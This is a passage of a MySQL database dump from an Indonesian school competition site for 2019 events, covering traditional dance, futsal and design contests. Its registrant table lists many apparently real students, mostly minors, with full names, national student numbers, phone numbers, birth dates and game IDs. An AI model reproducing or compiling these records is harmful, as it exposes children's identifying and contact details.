terdapat gugatan hak cipta, pihak panitia tidak bertanggung jawab atas hal tersebut, panitia akan berasumsi bahwa seluruh desain yang diikutsertakan merupakan karya orisinil peserta.</li>\r\n <li>Panitia berhak menggunakan karya untuk keperluan publikasi.</li>\r\n  <li>Petunjuk pelaksanaan dan petunjuk teknis akan dibahas pada saat technical meeting.</li>\r\n</ol>\r\n<p><strong>Kriteria Penilaian</strong></p>\r\n<ol>\r\n  <li>Originalitas.</li>\r\n  <li>Konsep ide desain.</li>\r\n <li>Teknik penggunaan software.</li>\r\n  <li>Komposisi warna & tata letak nilai estetika.</li>\r\n <li>Kesesuaian tema.</li>\r\n <li>Pesan yang disampaikan.</li>\r\n  <li>Penyampaian saat presentasi.</li>\r\n</ol>', '', '', 1, 1, 1, 50000, '082117067306 (Zahra)', '08979233438 (Della)', '<ul>\r\n <li>\r\n  <p><strong>HARI &amp; TANGGAL :</strong></p>\r\n\r\n  <ul>\r\n    <li>Kamis, 14 November 2019</li>\r\n  </ul>\r\n </li>\r\n <li>\r\n  <p><strong>WAKTU :</strong></p>\r\n\r\n <ul>\r\n    <li>12.00 &ndash; selesai</li>\r\n  </ul>\r\n </li>\r\n <li>\r\n  <p><strong>TEMPAT :</strong></p>\r\n\r\n  <ul>\r\n    <li>AULA SMK Telekomunikasi Telesandi Bekasi</li>\r\n </ul>\r\n </li>\r\n</ul>', '<ul>\r\n  <li>\r\n  <p><strong>HARI &amp; TANGGAL :</strong></p>\r\n\r\n  <ul>\r\n    <li>Sabtu, 16 November 2019</li>\r\n  </ul>\r\n </li>\r\n <li>\r\n  <p><strong>WAKTU :</strong></p>\r\n\r\n <ul>\r\n    <li>08.00 &ndash; 17.00 WIB</li>\r\n  </ul>\r\n </li>\r\n <li>\r\n  <p><strong>TEMPAT :</strong></p>\r\n\r\n  <ul>\r\n    <li>Lab SMK Telekomunikasi Telesandi Bekasi</li>\r\n  </ul>\r\n </li>\r\n</ul>', '<ul>\r\n  <li>2 September 2019 &ndash; 11 November 2019</li>\r\n</ul>', '2019-11-11'),
(9, 'Tari Tradisional', '1567219349.png', '<p><strong>PENDAFTARAN :</strong></p>\r\n\r\n<ul>\r\n  <li>\r\n  <p>2 September 2019 &ndash; 11 November 2019</p>\r\n  </li>\r\n</ul>\r\n\r\n<p><strong>HARI &amp; TANGGAL PELAKSANAAN :</strong></p>\r\n\r\n<ul>\r\n  <li>Minggu, 17 November 2019</li>\r\n</ul>\r\n\r\n<p><strong>TECHNICAL MEETING :</strong></p>\r\n\r\n<ul>\r\n <li>Kamis, 14 November 2019</li>\r\n</ul>\r\n\r\n<p><strong>WAKTU :</strong></p>\r\n\r\n<ul>\r\n  <li>08.00 &ndash; selesai</li>\r\n</ul>\r\n\r\n<p><strong>TEMPAT :</strong></p>\r\n\r\n<ul>\r\n <li>Aula SMK Telekomunikasi Telesandi Bekasi</li>\r\n</ul>', '<ol>\r\n	<li>Perlombaan terbuka untuk SMP/MTS dan&nbsp;SMA/SMK sederajat.</li>\r\n	<li>Pendaftaran akan ditutup apabila kategori perlombaan sudah mencapai batas maksimun.</li>\r\n	<li>Perlombaan bersifat kelompok, satu kelompok terdiri dari 3-5 orang.</li>\r\n	<li>Satu sekolah boleh mengirimkan lebih dari 1 group.</li>\r\n	<li>Peserta melakukan registrasi ulang 15 menit sebelum perlombaan dimulai.</li>\r\n	<li>Peserta diberi waktu maksimal 10 menit setelah pemanggilan dan sudah wajib siap di lapangan untuk mengikuti perlombaan.</li>\r\n	<li>Peserta wajib mengikuti technical meeting, jika peserta tidak hadir maka peserta telah menyetujui semua persyaratannya.</li>\r\n	<li>Setiap peserta harus menaati peraturan yang telah ditentukan panitia.</li>\r\n	<li>Petunjuk pelaksanaan dan petunjuk teknis akan dibahas pada saat technical meeting berlangsung.</li>\r\n</ol>', '', '', 3, 5, 1, 150000, '081382746346 (Caca)', '081314975518 (Liyani)', '<ul>\r\n	<li>\r\n	<p><strong>HARI &amp; TANGGAL :</strong></p>\r\n\r\n	<ul>\r\n		<li>Kamis, 14 November 2019</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>WAKTU :</strong></p>\r\n\r\n	<ul>\r\n		<li>14.00 &ndash; selesai</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>TEMPAT :</strong></p>\r\n\r\n	<ul>\r\n		<li>AULA SMK Telekomunikasi Telesandi Bekasi</li>\r\n	</ul>\r\n	</li>\r\n</ul>', '<ul>\r\n	<li>\r\n	<p><strong>HARI &amp; TANGGAL :</strong></p>\r\n\r\n	<ul>\r\n		<li>Sabtu, 16 November 2019</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>WAKTU :</strong></p>\r\n\r\n	<ul>\r\n		<li>08.00 &ndash; 17.00 WIB</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>TEMPAT :</strong></p>\r\n\r\n	<ul>\r\n		<li>Aula SMK Telekomunikasi Telesandi Bekasi</li>\r\n	</ul>\r\n	</li>\r\n</ul>', '<ul>\r\n	<li>2 September 2019 &ndash; 11 November 2019</li>\r\n</ul>', '2019-11-13'),
(10, 'Futsal SMP', '1567219742.png', '<p><strong>PENDAFTARAN :</strong></p>\r\n\r\n<ul>\r\n <li>\r\n  <p>2 September &ndash; 28 Oktober 2019</p>\r\n  </li>\r\n</ul>\r\n\r\n<p><strong>TANGGAL PELAKSANAAN :</strong></p>\r\n\r\n<ul>\r\n <li>Sabtu, 2 November 2019</li>\r\n</ul>\r\n\r\n<p><strong>TECHNICAL MEETING :</strong></p>\r\n\r\n<ul>\r\n <li>Rabu, 30 Oktober 2019</li>\r\n</ul>\r\n\r\n<p><strong>WAKTU :</strong></p>\r\n\r\n<ul>\r\n  <li>10.00 &ndash; selesai</li>\r\n</ul>\r\n\r\n<p><strong>TEMPAT :</strong></p>\r\n\r\n<ul>\r\n <li>SMK Telekomunikasi Telesandi Bekasi</li>\r\n</ul>', '<ol>\r\n	<li>Peserta lomba adalah siswa&nbsp;SMP/MTS sederajat</li>\r\n	<li>Sistem pertandingan menggunakan sistem gugur.</li>\r\n	<li>Satu tim terdiri dari 12 pemain, 1 orang pelatih ,dan 1 orang official.</li>\r\n	<li>Pemain wajib memakai kostum futsal bernomor, kaos kaki, decker,dan sepatu futsal.</li>\r\n	<li>Tim wajib hadir 30 menit sebelum pertandingan.</li>\r\n	<li>Pemain wajib menyerahkan foto ukuran 3x4 dua lembar, fotocopy rapot 1(satu) lembar, surat keterangan dari sekolah, dan fotokopi&nbsp;kartu pelajar satu lembar.</li>\r\n	<li>Setiap sekolah wajib membawa supporter minimal 15 orang.</li>\r\n	<li>Petunjuk pelaksanaan dan petunjuk teknis akan dibahas pada saat technical meeting.</li>\r\n</ol>', '', '', 12, 12, 2, 300000, '089632031230 (Fahmi)', '081315413103 (Hazby)', '<ul>\r\n	<li>\r\n	<p><strong>HARI &amp; TANGGAL :</strong></p>\r\n\r\n	<ul>\r\n		<li>Rabu, 30&nbsp;Oktober 2019</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>WAKTU :</strong></p>\r\n\r\n	<ul>\r\n		<li>10.00 &ndash; selesai</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>TEMPAT :</strong></p>\r\n\r\n	<ul>\r\n		<li>AULA SMK Telekomunikasi Telesandi Bekasi</li>\r\n	</ul>\r\n	</li>\r\n</ul>', '<ul>\r\n	<li>\r\n	<p><strong>TANGGAL :</strong></p>\r\n\r\n	<ul>\r\n		<li>3 November 2019 &ndash; 16 November 2019</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>WAKTU :</strong></p>\r\n\r\n	<ul>\r\n		<li>08.00 &ndash; 17.00 WIB</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>TEMPAT :</strong></p>\r\n\r\n	<ul>\r\n		<li>Lapangan SMK Telekomunikasi Telesandi Bekasi</li>\r\n	</ul>\r\n	</li>\r\n</ul>', '<ul>\r\n	<li>2 September 2019 &ndash; 28 Oktober&nbsp;2019</li>\r\n</ul>', '2019-10-30'),
(11, 'Futsal SMA', '1568255070.png', '<p><strong>PENDAFTARAN :</strong></p>\r\n\r\n<ul>\r\n <li>\r\n  <p>2 September &ndash; 28 Oktober 2019</p>\r\n  </li>\r\n</ul>\r\n\r\n<p><strong>TANGGAL PELAKSANAAN :</strong></p>\r\n\r\n<ul>\r\n <li>Sabtu, 2 November 2019</li>\r\n</ul>\r\n\r\n<p><strong>TECHNICAL MEETING :</strong></p>\r\n\r\n<ul>\r\n <li>Rabu, 30 Oktober 2019</li>\r\n</ul>\r\n\r\n<p><strong>WAKTU :</strong></p>\r\n\r\n<ul>\r\n  <li>10.00 &ndash; selesai</li>\r\n</ul>\r\n\r\n<p><strong>TEMPAT :</strong></p>\r\n\r\n<ul>\r\n <li>SMK Telekomunikasi Telesandi Bekasi</li>\r\n</ul>', '<ol>\r\n	<li>Peserta lomba adalah siswa&nbsp;SMA/SMK sederajat</li>\r\n	<li>Sistem pertandingan menggunakan sistem gugur.</li>\r\n	<li>Satu tim terdiri dari 12 pemain, 1 orang pelatih ,dan 1 orang official.</li>\r\n	<li>Pemain wajib memakai kostum futsal bernomor, kaos kaki, decker,dan sepatu futsal.</li>\r\n	<li>Tim wajib hadir 30 menit sebelum pertandingan.</li>\r\n	<li>Pemain wajib menyerahkan foto ukuran 3x4 dua lembar, fotocopy rapot 1(satu) lembar, surat keterangan dari sekolah, dan fotokopi&nbsp;kartu pelajar satu lembar.</li>\r\n	<li>Setiap sekolah wajib membawa supporter minimal 15 orang.</li>\r\n	<li>Petunjuk pelaksanaan dan petunjuk teknis akan dibahas pada saat technical meeting.</li>\r\n</ol>', '', '', 12, 12, 2, 350000, '089632031230 (Fahmi)', '0895350707347 (Ferlin)', '<ul>\r\n	<li>\r\n	<p><strong>HARI &amp; TANGGAL :</strong></p>\r\n\r\n	<ul>\r\n		<li>Rabu, 30 Oktober 2019</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>WAKTU :</strong></p>\r\n\r\n	<ul>\r\n		<li>10.00 &ndash; selesai</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>TEMPAT :</strong></p>\r\n\r\n	<ul>\r\n		<li>AULA SMK Telekomunikasi Telesandi Bekasi</li>\r\n	</ul>\r\n	</li>\r\n</ul>', '<ul>\r\n	<li>\r\n	<p><strong>TANGGAL :</strong></p>\r\n\r\n	<ul>\r\n		<li>3 November 2019 &ndash; 16 November 2019</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>WAKTU :</strong></p>\r\n\r\n	<ul>\r\n		<li>08.00 &ndash; 17.00 WIB</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>TEMPAT :</strong></p>\r\n\r\n	<ul>\r\n		<li>Lapangan SMK Telekomunikasi Telesandi Bekasi</li>\r\n	</ul>\r\n	</li>\r\n</ul>', '<ul>\r\n	<li>2 September 2019 &ndash; 28 Oktober 2019</li>\r\n</ul>', '2019-10-30');

-- --------------------------------------------------------

--
-- Struktur dari tabel `data_pendaftar`
--

CREATE TABLE `data_pendaftar` (
  `id_data_daftar` int(11) NOT NULL,
  `id_daftar` int(11) NOT NULL,
  `img` text NOT NULL,
  `img_kartupelajar` text NOT NULL,
  `nisn` varchar(255) NOT NULL,
  `nama` text NOT NULL,
  `contact_person` text NOT NULL,
  `tgl_lahir` date NOT NULL,
  `job_desk` varchar(255) DEFAULT NULL,
  `idgame` int(50) DEFAULT NULL,
  `nickname` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `no_punggung` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `data_pendaftar`
--

INSERT INTO `data_pendaftar` (`id_data_daftar`, `id_daftar`, `img`, `img_kartupelajar`, `nisn`, `nama`, `contact_person`, `tgl_lahir`, `job_desk`, `idgame`, `nickname`, `no_punggung`) VALUES
(1, 6, '6_1568812714.png', '', '12312321', '1231', '2342342342', '2013-05-17', NULL, NULL, NULL, NULL),
(5, 10, '10_1569641576.jpg', '10_kartupelajar_1569641576.jpg', '0034592292', 'muhammad ihsan rabbani', '083805160454', '2003-06-08', NULL, 24725727, 'SPACEod', NULL),
(6, 10, '10_1569642393.jpg', '10_kartupelajar_1569642393.jpg', '0032590560', 'fathudin hibban', '081932733687', '2002-12-09', NULL, 276330193, 'TFC_Mslurr', NULL),
(7, 10, '10_1569642924.jpg', '10_kartupelajar_1569642924.jpg', '0034477455', 'muhammad ryan hidayat', '089635935625', '2003-01-30', NULL, 56455530, 'smile jack', NULL),
(8, 10, '10_1569643247.jpg', '10_kartupelajar_1569643247.jpg', '0032994236', 'muhammad rafli sikumbang', '087776455967', '2003-01-29', NULL, 90209140, 'Evr_Bigbos', NULL),
(9, 10, '10_1569643671.jpg', '10_kartupelajar_1569643671.jpg', '0074816613', 'muhammad firdaus azaria', '081289062173', '2007-01-31', NULL, 852551905, 'NESC Blakwin', NULL),
(10, 16, '16_1570973646.jpg', '16_kartupelajar_1570973646.png', '0023372251', 'William Shan Bailey Sitanggang', '088808105372', '2002-07-29', NULL, NULL, NULL, NULL),
(11, 34, '34_1571019183.jpg', '34_kartupelajar_1571019183.jpg', '0025630475', 'Nabila ardis Anggraini', '081315562651', '2002-08-26', 'Khansa', NULL, NULL, NULL),
(14, 34, '34_1571055834.jpg', '34_kartupelajar_1571055834.jpg', '0032810765', 'Deni setiawan', '082121615605', '2003-05-31', 'Camera man', NULL, NULL, NULL),
(15, 34, '34_1571056801.jpg', '34_kartupelajar_1571056801.jpg', '0032346841', 'Grecia Gabyneta', '081383557515', '2003-06-30', 'Guru BK', NULL, NULL, NULL),
(16, 34, '34_1571538775.jpg', '34_kartupelajar_1571538775.jpg', '00322811061', 'Rukmana nurkhopipah', '082125508052', '2003-05-16', 'Guru', NULL, NULL, NULL),
(17, 57, '57_1571798633.jpg', '57_kartupelajar_1571798633.png', '234567890', 'lkhkhjkhjk', '09876543', '2003-10-15', NULL, NULL, NULL, 46),
(18, 14, '14_1572246127.jpg', '14_kartupelajar_1572246127.jpg', '0026169290', 'Jody Setiawan', '089653920325', '2002-06-24', NULL, 732043253, 'NESC', NULL),
(20, 93, '93_1572350341.jpg', '.', '0064918032', 'M Surya Tamam', '0', '2006-09-18', NULL, 215679244, 'CBT', NULL),
(21, 94, '94_1572350531.jpg', '.', '0045717796', 'M. Rivaldo. S', '000', '2004-05-03', NULL, 63420163, 'BTM*JuitaBHR', NULL),
(22, 87, '87_1572350611.jpg', '.', '181910281', 'Reza Eka Putra', '0', '2003-01-06', NULL, 310467771, 'N2f kid', NULL),
(23, 80, '80_1572350632.jpg', '.', '0064792414', 'Ziandra Zavier Giansyah', '085', '2006-05-11', NULL, 960913081, 'NY', NULL),
(24, 82, '82_1572350670.jpg', '.', '0053474257', 'Rafa Abhista A', '0', '2005-11-26', NULL, 266374301, 'GZ. R sm', NULL),
(26, 81, '81_1572350680.jpg', '.', '0023436923', 'Fedriansyah', '0', '2002-02-16', NULL, 311032792, 'U4 sansbae', NULL),
(27, 94, '94_1572350704.jpg', '.', '0048187339', 'Rafiadhika b.p', '000', '2004-11-06', NULL, 17356972, 'BTM*Nellakhr*', NULL),
(28, 90, '90_1572350730.jpg', '.', '0052314903', 'KUSUMA IBNU KEMAL', '082174539657', '2005-06-22', NULL, 59675145, 'DRs', NULL),
(29, 84, '84_1572350761.JPG', '.', '-', 'Bayu Musnandarulloh', '0', '2003-02-04', NULL, 575479253, '[NS]Rhey ezy', NULL),
(31, 87, '87_1572350820.jpg', '.', '1819100126', 'Furqon aliansyah', '0', '2003-05-22', NULL, 35425378, 'MID Agerboy', NULL),
(32, 83, '83_1572350823.jpg', '.', '0044659856', 'Gilang Ardiansyah', '0', '2004-10-03', NULL, 673000574, 'Z2', NULL),
(33, 94, '94_1572350827.jpg', '.', '0042790981', 'Ahmas Irwan. N', '000', '2004-03-12', NULL, 513920413, 'PBL.Neew', NULL),
(34, 81, '81_1572350868.jpg', '.', '0032995190', 'Abyan M. Yamar', '0', '2003-03-18', NULL, 614777829, 'BS', NULL),
(35, 90, '90_1572350922.jpg', '.', '0055211009', 'David haris.w', '082175396328', '2005-05-07', NULL, 749641787, 'DAVID', NULL),
(36, 87, '87_1572350926.jpg', '.', '0043716217', 'M Naufal Zaki', '0', '2004-02-10', NULL, 451109135, 'MID Shadow', NULL),
(37, 84, '84_1572350949.JPG', '.', '-', 'Shoni Kurniawan', '0', '2002-08-30', NULL, 182864501, '[NS]ojol ezy', NULL),
(39, 82, '82_1572350954.jpg', '.', '0053493823', 'Cacah Aji Tara', '0', '2005-01-11', NULL, 585659036, 'GZ strom', NULL),
(41, 94, '94_1572350975.jpg', '.', '0046483102', 'Hana Permana', '000', '2003-04-17', NULL, 337820221, 'ReDzone.sky', NULL),
(42, 81, '81_1572350977.jpg', '.', '0027276706', 'Raymond Christian', '0', '2002-12-21', NULL, 52205674, 'RYmnd389DOV', NULL),
(43, 83, '83_1572350978.jpg', '.', '00445037828', 'Muhammad Iqbal R', '0', '2004-09-09', NULL, 356762910, 'Z3', NULL),
(44, 87, '87_1572351042.jpg', '.', '181910119', 'Fikri Firmansyah', '0', '2003-01-02', NULL, 313197132, 'MID asphyxia', NULL),
(45, 84, '84_1572351074.JPG', '.', '-', 'M.Indra Maliki', '0', '2002-05-28', NULL, 50210076, '[NS]Buna ezy', NULL),
(47, 90, '90_1572351112.jpg', '.', '0059720654', 'M.Fauzy.S', '082143765632', '2005-05-13', NULL, 384903529, 'OjayBks', NULL),
(48, 94, '94_1572351137.jpg', '.', '0047609834', 'Kafka Revo. m', '000', '2004-04-29', NULL, 326249544, 'GF2Indra', NULL),
(50, 82, '82_1572351194.jpg', '.', '0053482048', 'Afif Okta', '0', '2005-10-09', NULL, 1196974678, 'GZ king', NULL),
(51, 84, '84_1572351201.JPG', '.', '-', 'Adam Restu', '0', '2002-05-25', NULL, 182864501, '[NS]your ezy', NULL),
(52, 81, '81_1572351202.jpg', '.', '0032217356', 'Keny Prizky P.', '0', '2003-01-02', NULL, 216864294, 'INEf.', NULL),
(53, 83, '83_1572351231.jpg', '.', '0045378684', 'Muhammad Ilham', '0', '2004-12-23', NULL, 986017680, 'AIRC', NULL),
(54, 90, '90_1572351286.jpg', '.', '0053312287', 'M.Rafiq.Maulana', '082143967542', '2005-07-14', NULL, 204045521, 'CBT ', NULL),
(55, 82, '82_1572351314.jpg', '.', '0059653434', 'Marcelinus', '0', '2005-04-10', NULL, 314641897, 'GZ tobanga', NULL),
(56, 81, '81_1572351343.jpg', '.', '0044682416', 'Rakha Raditya Gati', '0', '2004-11-18', NULL, 78857653, 'Rpr', NULL),
(57, 93, '93_1572351386.jpg', '.', '0041579009', 'iqbal nur widyananta', '0', '2004-09-02', NULL, 694400412, 'CBT', NULL),
(58, 82, '82_1572351426.jpg', '.', '0048607227', 'Ahmad Muhassin', '0', '2005-09-25', NULL, 1176526951, 'GZ violet', NULL),
(59, 83, '83_1572351448.jpg', '.', '0053603858', 'Mozaky', '0', '2005-10-06', NULL, 113067943, 'ZERO', NULL),
(60, 80, '80_1572351450.jpg', '.', '0064230475', 'Muhammad Irfan Alfirdaus', '085', '2006-10-30', NULL, 389645519, 'NY', NULL),
(61, 90, '90_1572351482.jpg', '.', '0053030128', 'M.ILHAM', '082143956752', '2005-05-14', NULL, 851358902, 'ILHAM', NULL),
(62, 97, '97_1572351697.jpg', '.', '0042123606', 'Faundra Jibran f', '089665802570', '2004-12-21', NULL, 141639484, 'Cold brother killer', NULL),
(63, 93, '93_1572351732.jpg', '.', '0044133113', 'Karang saputra', '0', '2004-04-25', NULL, 220951482, 'CBT\'RAN', NULL),
(64, 80, '80_1572351741.jpg', '.', '0063353437', 'Muhmmad Ivan Alfirdaus', '085', '2006-10-30', NULL, 402364389, 'NY', NULL),
(66, 93, '93_1572351950.jpg', '.', '0037098398', 'Reno L pamas', '0', '2003-09-21', NULL, 493200893, 'CBT', NULL),
(67, 97, '97_1572351965.jpg', '.', '0059562968', 'Muhammad Irgan.C.M', '089665802570', '2005-07-21', NULL, 202846513, 'Y*E*D*E', NULL),
(68, 93, '93_1572352149.jpg', '.', '0063810422', 'Dimas kurnia nurfathoni', '0', '2006-10-28', NULL, 681183514, 'CBT', NULL),
(69, 80, '80_1572352157.jpg', '.', '0062882544', 'Muhammad Raafi', '085', '2006-04-22', NULL, 515688551, 'NY', NULL),
(70, 97, '97_1572352167.jpg', '.', '0075563705', 'Muhammad ervan.f', '089665802570', '2007-02-14', NULL, 35946330, 'Jedric Jafra', NULL),
(72, 98, '98_1572352349.jpg', '.', '002423836', 'Enos Wesli', '132463463', '2002-06-05', NULL, 216281052, 'ELCO.snoppy_46', NULL),
(73, 92, '92_1572352395.jpg', '.', '171810036', 'Anjas Rama', '082121436137', '2002-09-13', NULL, 207889093, 'AnjasRama13', NULL),
(74, 98, '98_1572352488.jpg', '.', '0020065725', 'Hilmi Safirul', '123123123123', '2002-01-16', NULL, 62518669, '@hilmisaputra_', NULL),
(75, 97, '97_1572352532.jpg', '.', '00516891148', 'Wendi nafi sahzada', '089665802570', '2005-01-25', NULL, 115348945, 'Eon clolufoxy', NULL),
(76, 98, '98_1572352681.jpg', '.', '0021269127', 'Yoga saputra', '123123123123', '2002-10-07', NULL, 133352533, 'ELCO.ERaGon', NULL),
(77, 97, '97_1572352685.jpg', '.', '0030972912', 'Muhammad vikar.m', '089665802570', '2003-05-14', NULL, 130302421, 'ss|vikar', NULL),
(78, 92, '92_1572352711.jpg', '.', '0043107327', 'Muhammad Khairul Huda', '082121436137', '2004-06-25', NULL, 28662403, 'CommanderHuda', NULL),
(79, 95, '95_1572352745.jpg', '.', '0045976270', 'M.Rifky Abdullah', '0', '2004-04-22', NULL, 216868653, '*Winner*', NULL),
(80, 100, '100_1572352783.JPG', '.', '0035727461', 'Muhammad Rezza Tri.A', '0', '2003-11-03', NULL, 63127538, 'Tesla R\'aV', NULL),
(81, 98, '98_1572352820.jpg', '.', '0026284862', 'M. Fajar', '123123123123', '2002-05-17', NULL, 93929190, 'garayuyee', NULL),
(82, 92, '92_1572352900.jpg', '.', '0042560120', 'Muhammad Ilham Siddiq', '082121436137', '2004-05-03', NULL, 321041238, 'Tn.Wazowski', NULL),
(83, 95, '95_1572353018.jpg', '.', '0049215404', 'Kevin Martuna LT', '0', '2004-10-08', NULL, 314316569, 'Ext.Geronimo_zz', NULL),
(84, 92, '92_1572353037.jpg', '.', '0044791476', 'Abdul Husen', '082121436137', '2004-02-26', NULL, 136316374, 'SULTAN.karlina', NULL),
(85, 98, '98_1572353069.jpg', '.', '0025517573', 'Bagas Albero J', '123123123123', '2002-07-02', NULL, 79163453, 'BagasAlbero02', NULL),
(86, 100, '100_1572353075.JPG', '.', '0028714381', 'Farhan Khairulloh', '0', '2002-12-27', NULL, 108250371, '~Toxic~', NULL),
(87, 96, '96_1572353088.jpg', '.', '0041698301', 'M. Rayhan Dzinulhaq', '085211846979', '2004-07-20', NULL, 73011949, 'NENEN', NULL),
(88, 95, '95_1572353170.jpg', '.', '0054493466', 'Musthoraihan AH', '0', '2005-08-04', NULL, 299929461, '{over~Lord}', NULL),
(89, 92, '92_1572353200.jpg', '.', '0044271087', 'Sulaeman Rosadi', '082121436137', '2004-09-08', NULL, 201528524, 'ANALOG', NULL),
(90, 96, '96_1572353279.jpg', '.', '0053557599', 'Candra Subagio hafidz', '085211846979', '2005-05-09', NULL, 367283604, 'Em El bau', NULL),
(91, 95, '95_1572353322.jpg', '.', '0053207617', 'Deri Feroianto', '0', '2005-01-15', NULL, 104787590, 'Aoexe', NULL),
(92, 96, '96_1572353443.jpg', '.', '0048477251', 'Tarzan faulana noufal', '085211846979', '2004-12-25', NULL, 18651062, 'Crinklyauthor58', NULL),
(93, 95, '95_1572353534.jpg', '.', '0051894422', 'Fauzi Baskara', '0', '2005-06-20', NULL, 250098896, '', NULL),
(95, 100, '100_1572353627.JPG', '.', '0015973636', 'Hafiz Deni Rahman', '0', '2002-08-18', NULL, 327889109, 'Suprise', NULL),
(96, 96, '96_1572353725.jpg', '.', '0054477304', 'Firdaus Dwi Putra', '085211846979', '2005-02-01', NULL, 120515510, 'NVLA spongebob', NULL),
(97, 100, '100_1572353728.JPG', '.', '0043012603', 'Danny Rafid Pratama', '0', '2004-02-09', NULL, 65968273, 'Jona', NULL),
(101, 96, '96_1572353870.jpg', '.', '0048977923', 'Rafli Putra Rahmandoni', '085211846979', '2004-11-24', NULL, 241088864, 'MVP.Rpr24', NULL),
(102, 100, '100_1572353972.JPG', '.', '0030031253', 'Ibrahim Farisy P', '0', '2003-01-31', NULL, 73337150, 'Tesla Baim', NULL),
(105, 34, '34_1572608586.jpg', '.', '0055815030', 'Wita siti cahyani', '089526981864', '2005-03-13', 'Teman alisya', NULL, NULL, NULL),
(106, 34, '34_1572608735.jpg', '.', '0049667975', 'Khairul Abiyyu rifqi', '089622944505', '2004-06-17', 'Teman Kayla', NULL, NULL, NULL),
(108, 115, '115_1572685612.jpg', '.', '0015694819', 'Fadlan Rayhan K', '0', '2001-07-30', NULL, 155539688, 'Dj_Jancukers', NULL),
(114, 119, '119_1572706470.JPG', '.', '0042331330', 'Anwar Rafi Herawan', '0', '2004-03-22', NULL, 42480745, 'Visella', NULL),
(115, 119, '119_1572706547.JPG', '.', '003621580', 'Adi Ripaldi', '0', '2003-12-08', NULL, 89889888, 'Dev', NULL),
(116, 119, '119_1572706652.JPG', '.', '0030180709', 'Akhdan Fakhri Tri I', '0', '2003-12-21', NULL, 335563725, 'Wahyu 06??', NULL),
(117, 119, '119_1572706716.JPG', '.', '0042344662', 'Muhammad Zahsy A', '0', '2004-05-11', NULL, 249491311, 'Wait. U will die', NULL),
(118, 119, '119_1572706812.png', '.', '0041095700', 'Gideon Ariston N', '0', '2004-02-11', NULL, 255458118, 'Fucc', NULL),
(119, 34, '34_1572742066.jpg', '.', '0026115992', 'Alisya nur fauzani', '08997702062', '2003-01-20', 'Alisya', NULL, NULL, NULL),
(122, 106, '106_1572784348.jpg', '.', '0032435538', 'Dimas Naufal Achmad', '081297736447', '2003-03-30', 'Pemain, Cameramen, Editor', NULL, NULL, NULL),
(123, 106, '106_1572784798.jpg', '.', '0031231621', 'Fachry Anwar Hawsyana', '08979737057', '2003-08-26', 'Pemain', NULL, NULL, NULL),
(124, 106, '106_1572785808.jpg', '.', '0036098220', 'Fernanda Faiz Listyarto', '081310050680', '2003-12-31', 'Cameramen', NULL, NULL, NULL),
(125, 34, '34_1572829602.jpg', '.', '0037137664', 'Anisah', '089673071901', '2003-03-02', 'Editor', NULL, NULL, NULL),
(127, 115, '115_1572868396.jpg', '.', '0022424655', 'Nando', '0', '2002-03-22', NULL, 205661158, 'Nando', NULL),
(128, 115, '115_1572868473.jpg', '.', '0020942013', 'Ilham', '0', '2002-02-14', NULL, 10280265, 'Fake. Bowo', NULL),
(129, 115, '115_1572869033.jpg', '.', '0020180094', 'Hanif Hidayatullah', '0', '2002-06-15', NULL, 149316249, 'Azkhanif rizki', NULL),
(130, 115, '115_1572870403.jpg', '.', '0022272981', 'Adithia', '0', '2002-11-05', NULL, 141885456, 'Mabok 1', NULL),
(131, 122, '122_1572870850.jpg', '.', '0618947397', 'Soeltan MA', '0', '2001-05-01', NULL, 150810453, 'Sultan siowpang', NULL),
(132, 122, '122_1572870929.jpg', '.', '0011311055', 'Rico', '0', '2001-12-21', NULL, 134860956, 'Hul maxy\'s', NULL),
(133, 122, '122_1572871038.jpg', '.', '9994270298', 'Rizal', '0', '2001-08-13', NULL, 65457931, 'Rising. Juho', NULL),
(134, 122, '122_1572871116.jpg', '.', '0010494482', 'Ramdan', '0', '2001-06-09', NULL, 245983952, 'aDankz2', NULL),
(135, 122, '122_1572871197.jpg', '.', '0013976725', 'A. Muhorobin', '0', '2001-04-09', NULL, 245983952, 'Ahmad muhorobin', NULL),
(138, 123, '123_1572873175.jpg', '.', '0058806721', 'Refy Rizky R', '0', '2005-08-22', NULL, 19285134, 'Rynn', NULL),
(139, 123, '123_1572873439.jpg', '.', '0044158539', 'Julius Christian Denny', '0', '2004-12-04', NULL, 20634840, 'Rosevelt', NULL),
(140, 123, '123_1572873541.jpg', '.', '0052630517', 'Abdel Sulthan Ar-Rauf', '0', '2005-02-27', NULL, 43235387, '• •', NULL),
(141, 123, '123_1572873785.jpg', '.', '0059524597', 'Agif Zaki Fadhillah', '0', '2005-11-02', NULL, 53776699, 'Syzya', NULL),
(142, 123, '123_1572874008.jpg', '.', '0044323747', 'Vhiraz Syawqi R.', '0', '2004-10-14', NULL, 71068760, '[Rs] Vhiraz', NULL),
(143, 34, '34_1573018556.jpg', '.', '0024858079', 'felia ananta', '089507322974', '2002-11-16', 'kayla', NULL, NULL, NULL),
(144, 125, '125_1573049960.jpg', '.', '0031062227', 'M Arif Wibowo', '0', '2003-10-15', NULL, 169477305, 'Raden•Masbowo™', NULL),
(146, 125, '125_1573050068.jpg', '.', '0020442549', 'Diar Firnando Bayu S', '0', '2002-12-20', NULL, 95747006, '•oxs•', NULL),
(147, 125, '125_1573050183.jpg', '.', '0032731529', 'Agung Adimas Saputra', '0', '2003-05-07', NULL, 174808637, 'adimas07', NULL),
(148, 125, '125_1573050303.jpg', '.', '0032113571', 'Gibran Alifia Hernandar', '0', '2003-10-03', NULL, 89489666, 'alamahoy', NULL),
